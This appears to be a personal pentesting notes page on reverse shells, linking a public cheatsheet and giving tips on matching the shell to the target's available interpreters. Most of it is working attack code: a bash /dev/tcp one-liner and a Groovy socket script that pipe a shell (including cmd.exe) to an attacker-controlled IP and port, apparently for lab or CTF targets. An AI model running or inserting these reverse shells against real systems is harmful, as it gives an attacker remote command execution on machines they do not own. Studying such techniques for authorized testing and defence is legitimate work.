
### General Notes

> Used to get remote code execution (RCE).

Can be found online: [Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).

---

### Finding the Right Reverse shell

Using the cheatsheet above, it has different techniques. Check first for the presence of that programming language or tool on the system before running these commands to make sure they can work.

> For example, to run the `python` one-liner, first make sure we can execute python on the target machine. Might work for `python` and not `python3`, so try all cases.

----
##### Bash Script to connect to our machine

> Set the [[IP]] address and [[Port]].
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```
>`script.sh`

> Make sure the file is executable.
```shell
chmod +x script.sh
```

---
### Groovy script to connect to our machine

``` groovy
String host="10.10.14.25";
int port=1337;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---
